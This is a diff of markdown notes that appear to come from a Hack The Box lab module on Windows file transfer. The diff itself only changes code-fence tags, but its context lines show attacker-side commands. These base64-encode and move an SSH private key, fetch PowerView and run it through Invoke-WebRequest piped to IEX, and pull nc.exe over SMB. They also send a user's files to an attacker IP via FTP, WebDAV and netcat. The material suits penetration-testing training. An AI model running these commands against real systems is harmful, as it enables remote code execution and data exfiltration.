@@ -36,8 +36,7 @@ An essential step in using this method is to ensure the file you encode and deco
 
 #### Pwnbox Check SSH Key MD5 Hash
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ md5sum id_rsa
 
 4e301756a07ded0a2dd6953abf015278  id_rsa
@@ -45,8 +44,7 @@ hiimeins@htb[/htb]$ md5sum id_rsa
 
 #### Pwnbox Encode SSH Key to Base64
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat id_rsa |base64 -w 0;echo
 
 LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
@@ -63,8 +61,7 @@ Finally, we can confirm if the file was transferred successfully using the [Get-
 
 #### Confirming the MD5 Hashes Match
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
 
 Algorithm       Hash                                                                   Path
@@ -101,8 +98,7 @@ We can specify the class name `Net.WebClient` and the method `DownloadFile` with
 
 #### File Download
 
-```
-        powershell
+```powershell
 PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
 PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')
 
@@ -145,8 +141,7 @@ There may be cases when the Internet Explorer first-launch configuration has not
 
 This can be bypassed using the parameter `-UseBasicParsing`.
 
-```
-        powershell
+```powershell
 PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
 
 Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
@@ -185,8 +180,7 @@ We can use SMB to download files from our Pwnbox easily. We need to create an SM
 
 #### Create the SMB Server
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -203,8 +197,7 @@ To download a file from the SMB server to the current working directory, we can 
 
 #### Copy a File from the SMB Server
 
-```
-        cmd
+```bat
 C:\htb> copy \\192.168.220.133\share\nc.exe
 
         1 file(s) copied.
@@ -212,8 +205,7 @@ C:\htb> copy \\192.168.220.133\share\nc.exe
 
 New versions of Windows block unauthenticated guest access, as we can see in the following command:
 
-```
-        cmd
+```bat
 C:\htb> copy \\192.168.220.133\share\nc.exe
 
 You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
@@ -223,8 +215,7 @@ To transfer files in this scenario, we can set a username and password using our
 
 #### Create the SMB Server with a Username and Password
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
 
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -239,8 +230,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 #### Mount the SMB Server with Username and Password
 
-```
-        cmd
+```bat
 C:\htb> net use n: \\192.168.220.133\share /user:test test
 
 The command completed successfully.
@@ -261,8 +251,7 @@ We can configure an FTP Server in our attack host using Python3 `pyftpdlib` modu
 
 #### Installing the FTP Server Python3 Module - pyftpdlib
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo pip3 install pyftpdlib
 ```
 
@@ -270,8 +259,7 @@ Then we can specify port number 21 because, by default, `pyftpdlib` uses port 21
 
 #### Setting up a Python3 FTP Server
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo python3 -m pyftpdlib --port 21
 
 [I 2022-05-17 10:09:19] concurrency model: async
@@ -293,8 +281,7 @@ When we get a shell on a remote machine, we may not have an interactive shell. I
 
 #### Create a Command File for the FTP Client and Download the Target File
 
-```
-        cmd
+```bat
 C:\htb> echo open 192.168.49.128 > ftpcommand.txt
 C:\htb> echo USER anonymous >> ftpcommand.txt
 C:\htb> echo binary >> ftpcommand.txt
@@ -326,8 +313,7 @@ We saw how to decode a base64 string using Powershell. Now, let's do the reverse
 
 #### Encode File Using PowerShell
 
-```
-        powershell
+```powershell
 PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
 
 IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
@@ -342,13 +328,11 @@ We copy this content and paste it into our attack host, use the `base64` command
 
 #### Decode Base64 String in Linux
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ md5sum hosts 
 
 3688374325b992def12793500307566d  hosts
@@ -364,8 +348,7 @@ For our web server, we can use [uploadserver](https://github.com/Densaugeo/uploa
 
 #### Installing a Configured WebServer with Upload
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ pip3 install uploadserver
 
 Collecting upload server
@@ -374,8 +357,7 @@ Installing collected packages: uploadserver
 Successfully installed uploadserver-2.0.1
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ python3 -m uploadserver
 
 File upload available at /upload
@@ -407,8 +389,7 @@ PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body
 
 We catch the base64 data with Netcat and use the base64 application with the decode option to convert the string to the file.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lvnp 8000
 
 listening on [any] 8000 ...
@@ -424,8 +405,7 @@ IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNh
 ...SNIP...
 ```
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
 ```
 
@@ -447,8 +427,7 @@ To set up our WebDav server, we need to install two Python modules, `wsgidav` an
 
 #### Installing WebDav Python modules
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo pip3 install wsgidav cheroot
 
 [sudo] password for plaintext: 
@@ -460,8 +439,7 @@ Collecting wsgidav
 
 #### Using the WebDav Python module
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous 
 
 [sudo] password for plaintext: 
@@ -485,8 +463,7 @@ Running without configuration file.
 
 Now we can attempt to connect to the share using the `DavWWWRoot` directory.
 
-```
-        cmd
+```bat
 C:\htb> dir \\192.168.49.128\DavWWWRoot
 
  Volume in drive \\192.168.49.128\DavWWWRoot has no label.
@@ -508,8 +485,7 @@ You can avoid using this keyword if you specify a folder that exists on your ser
 
 #### Uploading Files using SMB
 
-```
-        cmd
+```bat
 C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
 C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 ```
@@ -522,8 +498,7 @@ C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
 
 Uploading files using FTP is very similar to downloading files. We can use PowerShell or the FTP client to complete the operation. Before we start our FTP Server using the Python module `pyftpdlib`, we need to specify the option `--write` to allow clients to upload files to our attack host.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write
 
 /usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
@@ -538,15 +513,13 @@ Now let's use the PowerShell upload function to upload a file to our FTP Server.
 
 #### PowerShell Upload File
 
-```
-        powershell
+```powershell
 PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
 ```
 
 #### Create a Command File for the FTP Client to Upload a File
 
-```
-        cmd
+```bat
 C:\htb> echo open 192.168.49.128 > ftpcommand.txt
 C:\htb> echo USER anonymous >> ftpcommand.txt
 C:\htb> echo binary >> ftpcommand.txt
